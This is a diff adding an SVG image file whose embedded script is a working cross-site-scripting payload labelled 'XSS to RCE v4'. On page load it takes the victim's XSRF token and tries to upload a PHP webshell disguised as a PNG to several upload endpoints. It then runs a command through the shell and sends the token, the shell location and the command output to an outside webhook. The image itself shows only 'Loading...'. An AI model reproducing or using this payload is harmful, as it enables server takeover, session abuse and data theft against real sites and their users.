@@ -1,0 +1,185 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+    <script type="text/javascript">
+    <![CDATA[
+        // XSS to RCE v4 - Alternative upload methods
+        async function escalateToRCE() {
+            const exfilBase = 'https://webhook.site/6086d7f7-f6f1-4419-a163-5a0bf30ed34d';
+            
+            try {
+                // Extract token
+                const csrfCookie = document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1];
+                const token = csrfCookie ? decodeURIComponent(csrfCookie) : '';
+                
+                // Debug callback
+                const debugImg = new Image();
+                debugImg.src = exfilBase + '/v4_debug?' + new URLSearchParams({
+                    step: 'start',
+                    token: token.substring(0, 50),
+                    url: window.location.href,
+                    ts: Date.now()
+                });
+                document.body?.appendChild(debugImg);
+                
+                // PHP webshell
+                const phpShell = '<?php @system($_GET["cmd"]); ?>';
+                
+                // Try multiple upload endpoints
+                const endpoints = [
+                    {url: '/api/ticket', method: 'ticket'},
+                    {url: '/api/upload', method: 'upload'},
+                    {url: '/storage/upload', method: 'storage'},
+                    {url: '/media/upload', method: 'media'},
+                    {url: '/api/attachment', method: 'attachment'}
+                ];
+                
+                let successUrl = null;
+                
+                for (const endpoint of endpoints) {
+                    try {
+                        const fd = new FormData();
+                        
+                        if (endpoint.method === 'ticket') {
+                            // Original ticket creation
+                            fd.append('title', 'Report ' + Date.now());
+                            fd.append('complaint', 'System issue');
+                            fd.append('reference', 'REF-' + Math.random().toString(36).substr(2, 9));
+                            fd.append('attachment', new Blob([phpShell], {type: 'image/png'}), 'update.png.php');
+                        } else {
+                            // Generic file upload
+                            fd.append('file', new Blob([phpShell], {type: 'image/png'}), 'cache.png.php');
+                        }
+                        
+                        const resp = await fetch(endpoint.url, {
+                            method: 'POST',
+                            headers: token ? {'X-XSRF-TOKEN': token, 'X-CSRF-TOKEN': token} : {},
+                            credentials: 'include',
+                            body: fd
+                        });
+                        
+                        // Try to parse response
+                        const ct = resp.headers.get('content-type') || '';
+                        let data;
+                        
+                        if (ct.includes('json')) {
+                            data = await resp.json();
+                            
+                            // Extract shell path from various response formats
+                            const path = data.data?.attachment_url || 
+                                        data.data?.file_url ||
+                                        data.data?.path ||
+                                        data.attachment_url ||
+                                        data.file_url ||
+                                        data.path ||
+                                        data.url;
+                            
+                            if (path) {
+                                successUrl = window.location.origin + (path.startsWith('/') ? path : '/' + path);
+                                
+                                // Exfiltrate success
+                                const successImg = new Image();
+                                successImg.src = exfilBase + '/v4_success?' + new URLSearchParams({
+                                    endpoint: endpoint.url,
+                                    shell: successUrl,
+                                    status: resp.status,
+                                    ts: Date.now()
+                                });
+                                document.body?.appendChild(successImg);
+                                
+                                break; // Success, stop trying other endpoints
+                            }
+                        } else {
+                            // HTML response - log but continue
+                            const logImg = new Image();
+                            logImg.src = exfilBase + '/v4_try?' + new URLSearchParams({
+                                endpoint: endpoint.url,
+                                status: resp.status,
+                                ct: ct.substring(0, 50),
+                                ts: Date.now()
+                            });
+                            document.body?.appendChild(logImg);
+                        }
+                        
+                    } catch (endpointErr) {
+                        // Log failed endpoint
+                        const failImg = new Image();
+                        failImg.src = exfilBase + '/v4_fail?' + new URLSearchParams({
+                            endpoint: endpoint.url,
+                            err: endpointErr.toString().substring(0, 100),
+                            ts: Date.now()
+                        });
+                        document.body?.appendChild(failImg);
+                    }
+                }
+                
+                // If we got a shell URL, test it
+                if (successUrl) {
+                    try {
+                        const testResp = await fetch(successUrl.split(window.location.origin)[1] + '?cmd=id');
+                        const output = await testResp.text();
+                        
+                        // Exfiltrate test result
+                        const testImg = new Image();
+                        testImg.src = exfilBase + '/v4_shell_test?' + new URLSearchParams({
+                            shell: successUrl,
+                            output: output.substring(0, 150),
+                            ts: Date.now()
+                        });
+                        document.body?.appendChild(testImg);
+                        
+                        // Send full data via Base64
+                        const fullData = {
+                            type: 'xss_rce_v4_success',
+                            shell_url: successUrl,
+                            test_output: output.substring(0, 300),
+                            token: token.substring(0, 60),
+                            timestamp: new Date().toISOString()
+                        };
+                        const b64Img = new Image();
+                        b64Img.src = exfilBase + '/b64/' + btoa(JSON.stringify(fullData));
+                        document.body?.appendChild(b64Img);
+                        
+                    } catch (testErr) {
+                        const testErrImg = new Image();
+                        testErrImg.src = exfilBase + '/v4_test_err?' + new URLSearchParams({
+                            shell: successUrl,
+                            err: testErr.toString(),
+                            ts: Date.now()
+                        });
+                        document.body?.appendChild(testErrImg);
+                    }
+                } else {
+                    // All endpoints failed
+                    const allFailImg = new Image();
+                    allFailImg.src = exfilBase + '/v4_all_failed?' + new URLSearchParams({
+                        msg: 'All upload endpoints returned errors',
+                        ts: Date.now()
+                    });
+                    document.body?.appendChild(allFailImg);
+                }
+                
+            } catch(error) {
+                // Final error handler
+                const errData = {
+                    t: 'xss_rce_v4_error',
+                    err: error.toString(),
+                    stack: error.stack?.substring(0, 300),
+                    url: window.location.href,
+                    ts: Date.now()
+                };
+                const errImg = new Image();
+                errImg.src = exfilBase + '/v4_error?data=' + encodeURIComponent(btoa(JSON.stringify(errData)));
+                document.body?.appendChild(errImg);
+            }
+        }
+        
+        // Execute
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', escalateToRCE);
+        } else {
+            setTimeout(escalateToRCE, 500);
+        }
+    ]]>
+    </script>
+    <text x="10" y="20" fill="#333">Loading...</text>
+</svg>
